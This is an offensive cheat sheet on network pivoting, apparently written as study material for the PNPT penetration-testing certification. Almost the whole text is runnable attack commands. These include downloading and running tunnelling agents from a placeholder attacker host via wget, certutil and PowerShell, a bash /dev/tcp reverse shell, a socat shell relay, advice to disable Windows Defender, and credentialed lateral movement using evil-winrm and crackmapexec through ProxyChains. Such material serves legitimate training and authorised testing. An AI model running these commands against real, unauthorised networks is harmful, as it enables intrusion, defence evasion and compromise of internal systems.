This is a pivoting techniques cheat sheet for the PNPT (Practical Network Penetration Tester) certification by TCM Security.

Pivoting is the technique of moving from an established foothold into internal networks that are otherwise unreachable.

### [Pivoting Attack Flow]

The goal is to use a dual-homed host as a relay point to access the internal network.

※ Dual-homed host = a host connected to both external and internal networks (e.g., a web server with both internet access and a DB server connection)

```bash
[Shell obtained on foothold host via external penetration]

Phase 1. Check Network Interfaces
  Confirm dual-homed host with ip addr / ipconfig /all
  Identify internal subnet range

[Confirm foothold host is dual-homed across two networks]

Phase 2. Select and Configure Pivoting Tool
  Binary upload possible     → Ligolo-ng (top recommendation, no ProxyChains needed)
  SSH + Python available     → sshuttle (simplest, no ProxyChains needed)
  SSH only                   → SSH -D + ProxyChains
  No SSH (Windows shell)     → Chisel reverse SOCKS + ProxyChains

Phase 3. Set Up Tunnel and Verify Internal Access
  Verify with TCP-based tools, not ping (ICMP unavailable through SOCKS)
  Scan internal hosts with nmap -sT -Pn -n

Phase 4. Internal Enumeration → AD Attacks
  Enumerate SMB hosts with CrackMapExec/NetExec
  Proceed with BloodHound, Kerberoasting, and other AD attacks

[Domain Controller compromised → screenshot → report]
```

※ Take a screenshot immediately upon discovering a dual-homed interface. Missing the pivot path in your report will cost you points.

### [Phase 1: Check Network Interfaces]

The goal is to determine whether the foothold host is connected to the internal network.

### [1-1: Interface and Internal Host Discovery]

**Requirements:**

```bash
1. Shell access on the foothold host
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Check interfaces with ip addr / ipconfig
2. If two or more different subnets appear → dual-homed host confirmed
3. Check routing table to identify internal network range
4. Check ARP cache to find hosts already communicating internally

--------------------------------------------------------------

(Linux)

ip addr                       # check all interfaces
ip route                      # routing table
arp -a                        # ARP cache (hints about internal hosts)

--------------------------------------------------------------

(Windows)

ipconfig /all
route print
arp -a
```

※ If two or more different subnet addresses appear, you've found a pivot point.

### [Phase 2: Ligolo-ng]

The goal is to create a TUN interface-based VPN tunnel for direct access to the entire internal network.

All tools work without ProxyChains — TCM Security's current top recommended pivot tool.

### [2-1: Installation and Download]

**Requirements:**

```bash
1. sudo privileges on attacker machine (Kali)
2. Ability to upload files to foothold host
3. proxy and agent versions must match exactly
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Install proxy on attacker machine
2. Download agent matching the foothold host OS
3. Transfer agent to foothold host

--------------------------------------------------------------

(Attacker machine — install proxy)

# Kali package install (simplest)
sudo apt update && sudo apt install ligolo-ng

# Or download binary directly from GitHub
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz

--------------------------------------------------------------

(Download agent — by OS)

# For Linux target
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz

# For Windows target
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip

--------------------------------------------------------------

(Transfer agent to foothold host)

# Attacker: start HTTP server
python3 -m http.server 80

# Linux foothold
wget http://[ATTACKER-IP]/agent && chmod +x agent

# Windows foothold
certutil -urlcache -f http://[ATTACKER-IP]/agent.exe agent.exe
powershell iwr -Uri http://[ATTACKER-IP]/agent.exe -OutFile agent.exe
```

### [2-2: Proxy Server Setup — Attacker Machine]

**Requirements:**

```bash
1. sudo privileges on attacker machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Create TUN interface (one time only)
2. Start proxy server
3. Wait for agent connection

--------------------------------------------------------------

(Commands)

# Create TUN interface (run only once)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

# Start proxy server (self-signed cert, for lab/exam environment)
./proxy -selfcert

# Change port if needed (default 11601)
./proxy -selfcert -laddr 0.0.0.0:443
```

### [2-3: Run Agent — Foothold Host]

**Requirements:**

```bash
1. Agent file exists on foothold host
2. Proxy is running on attacker machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Run agent on foothold host
2. Connect to attacker proxy IP and port
3. Confirm session in proxy console

--------------------------------------------------------------

(Commands)

# Linux foothold
./agent -connect [ATTACKER-IP]:11601 -ignore-cert

# Windows foothold
.\agent.exe -connect [ATTACKER-IP]:11601 -ignore-cert
```

※ Agent runs without admin/root privileges. If Windows Defender blocks it, disable Defender first.

### [2-4: Session Connect and Route Setup]

**Requirements:**

```bash
1. Agent session connected in proxy console
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Select session in proxy console
2. Check agent's network interfaces
3. Identify internal subnet range
4. Start tunnel
5. Add route on attacker machine
6. Confirm internal network access

--------------------------------------------------------------

(Proxy console commands)

# List and select session
ligolo-ng » session
? Specify a session : 1

# Check agent network interfaces (critical!)
[Agent : user@pivot] » ifconfig
# eth0: 192.168.x.x  (external network)
# eth1: 172.16.5.x   (internal network ← pivot target!)

# Start tunnel
[Agent : user@pivot] » start

--------------------------------------------------------------

(Attacker machine — add route in separate terminal)

sudo ip route add 172.16.5.0/24 dev ligolo

# Verify route
ip route | grep ligolo

--------------------------------------------------------------

(Verify internal access — use TCP-based check!)

nmap -sT -Pn -n -p 22,80,445 172.16.5.10
```

※ Always verify with nmap -sT -Pn, not ping. TCP connection must be confirmed.

### [2-5: Listener — Receiving Reverse Shell from Internal Host]

When an internal host sends a reverse shell back to the attacker, the pivot host acts as a relay.

**Requirements:**

```bash
1. Ligolo-ng tunnel is active
2. Reverse shell can be executed on the internal target
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Add listener in proxy console
2. Start netcat listener on attacker machine
3. Execute reverse shell from internal target pointing to pivot host's internal IP
4. Receive shell on attacker netcat

--------------------------------------------------------------

(Proxy console — add listener)

[Agent : user@pivot] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

--------------------------------------------------------------

(Attacker machine — netcat listener)

nc -lvnp 4444

--------------------------------------------------------------

(Internal target — use pivot host's internal IP!)

bash -i >& /dev/tcp/172.16.5.1/4444 0>&1

--------------------------------------------------------------

(Listener management)

listener_list           # list active listeners
listener_stop --id 0    # stop a specific listener
```

### [2-6: Double Pivot]

Used when you need to reach a third network segment through the foothold host.

**Requirements:**

```bash
1. Pivot1 session is active
2. Pivot2 is also connected to a third network (172.16.200.0/24)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Create second TUN interface on attacker machine
2. Add proxy port listener on Pivot1 session
3. Run agent from Pivot2 connecting to Pivot1's internal IP
4. Start tunnel on second TUN interface

--------------------------------------------------------------

(Attacker machine — second TUN interface)

sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add 172.16.200.0/24 dev ligolo2

--------------------------------------------------------------

(Proxy console — add listener on Pivot1 session)

[Agent : user@pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

--------------------------------------------------------------

(Run agent on Pivot2 — connect to Pivot1's internal IP)

./agent -connect 172.16.150.10:11601 -ignore-cert

--------------------------------------------------------------

(Proxy console — select Pivot2 session, start tunnel on second TUN)

ligolo-ng » session → select 2
[Agent : admin@pivot2] » tunnel_start --tun ligolo2

# Now 172.16.200.0/24 is directly accessible!
```

### [Phase 3: Chisel]

The goal is to create a SOCKS5 proxy via HTTP WebSocket tunneling to access the internal network.

Useful when SSH is unavailable or only HTTP is allowed through a firewall.

### [3-1: Reverse SOCKS5 Proxy (Most Common Pattern)]

**Requirements:**

```bash
1. Chisel binary exists on both attacker and foothold host
2. Outbound connection from foothold host to attacker is possible
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Start chisel server on attacker machine
2. Run chisel client on foothold host
3. SOCKS5 proxy created on attacker's 127.0.0.1:1080
4. Configure ProxyChains and access internal network

--------------------------------------------------------------

(Attacker machine — server)

chisel server --reverse --port 8080

--------------------------------------------------------------

(Foothold host — client)

# Linux
./chisel client [ATTACKER-IP]:8080 R:socks

# Windows
.\chisel.exe client [ATTACKER-IP]:8080 R:socks

--------------------------------------------------------------

(Attacker machine — ProxyChains config)

# Add to last line of /etc/proxychains4.conf
socks5 127.0.0.1 1080

--------------------------------------------------------------

(Internal network access — must use -sT -Pn -n!)

proxychains nmap -sT -Pn -n -p 22,80,445 172.16.5.10
proxychains crackmapexec smb 172.16.5.0/24
```

### [3-2: Reverse Port Forwarding (Specific Port Only)]

When only one specific service is needed, forward a single port without SOCKS.

**Requirements:**

```bash
1. Chisel server running on attacker machine
```

**Commands:**

```bash
# Attacker server
chisel server --reverse -p 8000

# Foothold: forward attacker port → target port
./chisel client [ATTACKER-IP]:8000 R:8080:172.16.5.19:80

# Forward multiple ports simultaneously
./chisel client [ATTACKER-IP]:8000 R:80:127.0.0.1:80 R:3389:172.16.5.19:3389

# Access directly from attacker
curl http://127.0.0.1:8080
xfreerdp /v:127.0.0.1:3389 /u:admin /p:password
```

### [Phase 4: SSH Tunneling]

The goal is to pivot using the foothold host's SSH without any additional tools.

SSH is available on almost every Linux server, so no extra binary upload is needed.

### [4-1: Dynamic Port Forwarding (-D) — SOCKS Proxy]

Creates a SOCKS proxy for dynamic access to the entire subnet.

**Requirements:**

```bash
1. SSH access to foothold host (credentials or key)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Run SSH dynamic forwarding from attacker
2. SOCKS proxy created on attacker's 127.0.0.1:1080
3. Configure ProxyChains and access internal network

--------------------------------------------------------------

(Commands)

# Basic
ssh -D 1080 user@[PIVOT-IP]

# Background, no shell (recommended)
ssh -D 1080 -C -N -f user@[PIVOT-IP]

# With SSH key
ssh -i id_rsa -D 1080 -C -N -f user@[PIVOT-IP]

# Option descriptions
# -D : dynamic port forwarding (SOCKS proxy)
# -N : no remote command execution (tunnel only)
# -f : run in background
# -C : enable compression
```

### [4-2: Local Port Forwarding (-L) — Access a Specific Service]

Brings a specific internal service to a local port.

**Requirements:**

```bash
1. SSH access to foothold host
```

**Commands:**

```bash
# Basic format
ssh -L [local port]:[target host]:[target port] user@[PIVOT-IP]

# Access internal web server
ssh -L 8080:172.16.5.19:80 user@10.10.10.50
# → access at http://127.0.0.1:8080

# Internal RDP forwarding
ssh -L 1337:172.16.5.50:3389 user@10.10.10.50 -i id_rsa -N -f
xfreerdp /v:127.0.0.1:1337 /u:admin /p:password
```

### [4-3: ProxyJump (-J) — Multi-Hop SSH]

SSH directly to the final target through an intermediate host.

**Requirements:**

```bash
1. SSH access to both Pivot1 and final target
```

**Commands:**

```bash
# Single jump
ssh -J user@pivot user@target

# Double jump
ssh -J user1@hop1,user2@hop2 user3@final_target
```

### [Phase 5: sshuttle]

The goal is to use SSH like a VPN for transparent access to the entire internal network.

All tools work directly without ProxyChains.

**Requirements:**

```bash
1. SSH access to foothold host
2. Python must be installed on foothold host
3. sudo privileges on attacker machine (for iptables modification)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Run sshuttle from attacker
2. Automatically creates iptables rules → transparent routing
3. Access internal network directly without ProxyChains

--------------------------------------------------------------

(Commands)

# Basic
sshuttle -r user@[PIVOT-IP] 172.16.5.0/24

# With SSH key
sshuttle -r user@[PIVOT-IP] --ssh-cmd "ssh -i id_rsa" 172.16.0.0/24

# Exclude pivot host IP (prevents routing loop)
sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5

# Include DNS
sshuttle --dns -r user@[PIVOT-IP] 172.16.0.0/24

# Background execution
sshuttle -D --pidfile /tmp/sshuttle.pid -r user@[PIVOT-IP] 172.16.0.0/24
```

※ sshuttle supports TCP only — UDP and ICMP are not supported. Also does not work on Windows targets (no Python).

### [Phase 6: ProxyChains Configuration]

The goal is to configure external tools to route through the SOCKS proxy into the internal network.

Essential companion for all SOCKS-based pivoting: Chisel, SSH -D, Metasploit socks_proxy, etc.

### [6-1: Config File Editing and Tool Integration]

**Requirements:**

```bash
1. SOCKS proxy already active
   (Chisel R:socks, SSH -D 1080, Metasploit socks_proxy, etc.)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Confirm proxy type and port
2. Edit /etc/proxychains4.conf
3. Prepend proxychains to any tool command

--------------------------------------------------------------

(/etc/proxychains4.conf edits)

dynamic_chain           # skip dead proxies — recommended for general pivoting
#strict_chain           # use when working with a single stable proxy

# DNS leak prevention (comment out if nmap hangs)
proxy_dns

tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080

--------------------------------------------------------------

(Tool integration — always use -sT -Pn -n!)

proxychains nmap -sT -Pn -n --top-ports 50 [TARGET-IP]
proxychains nmap -sT -Pn -n -sV -p 22,80,445 [TARGET-IP]
proxychains crackmapexec smb [TARGET-IP] -u 'admin' -p 'password'
proxychains netexec smb 172.16.5.0/24
proxychains evil-winrm -i [TARGET-IP] -u administrator -p 'Password123!'
proxychains ssh root@[TARGET-IP]
proxychains xfreerdp /v:[TARGET-IP] /u:user /p:password /cert:ignore
```

※ nmap -sS (SYN scan) does NOT work through proxychains. Always use -sT (TCP Connect).

※ If nmap hangs with proxy_dns enabled, comment it out and add the -n flag.

###

### [Phase 7: Metasploit Pivoting]

The goal is to configure routing and a SOCKS proxy using a Meterpreter session.

### [7-1: autoroute + SOCKS Proxy]

**Requirements:**

```bash
1. Meterpreter session on foothold host
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Add internal subnet routing via autoroute in Meterpreter session
2. Create SOCKS proxy with socks_proxy module
3. Configure ProxyChains and use external tools

--------------------------------------------------------------

(In Meterpreter session)

meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > run autoroute -p               # verify

--------------------------------------------------------------

(SOCKS proxy module)

msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j                                # run as background job
msf6 > jobs                                  # check running jobs

--------------------------------------------------------------

(Metasploit built-in scanners — usable with autoroute only)

msf6 > use post/multi/gather/ping_sweep
msf6 > set RHOSTS 10.10.10.0/24
msf6 > set SESSION 1 && run

msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 10.10.10.20
msf6 > set PORTS 22,80,445,3389 && run
```

### [7-2: Meterpreter Port Forwarding]

Used when you want to map a specific port directly without SOCKS.

```bash
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.20
# → access at http://127.0.0.1:8080

meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.20

meterpreter > portfwd list
meterpreter > portfwd flush
```

### [Phase 8: Auxiliary Port Forwarding Tools]

### [8-1: socat — Port Relay on Linux Pivot]

Used on a Linux foothold host to forward a specific port to an internal service.

**Requirements:**

```bash
1. socat installed on Linux foothold host, or binary uploaded
```

**Commands:**

```bash
# TCP port forwarding
socat TCP-LISTEN:33060,fork,reuseaddr TCP:172.16.5.19:3306 &

# Reverse shell relay (relay internal target shell to attacker)
socat TCP-LISTEN:8000,fork TCP:[ATTACKER-IP]:443

# Stop
kill $(pgrep socat)
```

### [8-2: netsh — Built-in Port Forwarding on Windows Pivot]

Used on a Windows foothold host to forward ports without uploading additional tools.

**Requirements:**

```bash
1. Administrator privileges on Windows foothold host
```

**Commands:**

```bash
# Add port forwarding rule
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=172.16.5.19 connectport=4444

# Add firewall rule (if needed)
netsh advfirewall firewall add rule name="fwd" dir=in action=allow protocol=TCP localport=4444

# Check rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Tool Selection Summary

```bash
[Recommended tool by situation]

Binary upload possible            → Ligolo-ng (no ProxyChains, top recommendation)
SSH + Python available            → sshuttle (no ProxyChains, simplest)
SSH only                          → SSH -D + ProxyChains
No SSH (Windows shell only)       → Chisel reverse SOCKS + ProxyChains
Meterpreter session available     → autoroute + socks_proxy + ProxyChains
Windows admin, need it fast       → netsh (no upload needed)
Only one specific port needed     → SSH -L or socat
```

### ProxyChains Absolute Rules

```bash
Flags that MUST be included with nmap when using ProxyChains:
  -sT    : TCP Connect scan (SYN scan unavailable)
  -Pn    : disable host discovery (ping unavailable)
  -n     : disable DNS resolution (prevents hang)

WRONG: proxychains nmap -sS 172.16.5.10
CORRECT: proxychains nmap -sT -Pn -n -p 445,3389 172.16.5.10
```

※ ICMP (ping) through SOCKS is fundamentally impossible — a ping failure does NOT mean pivoting failed.
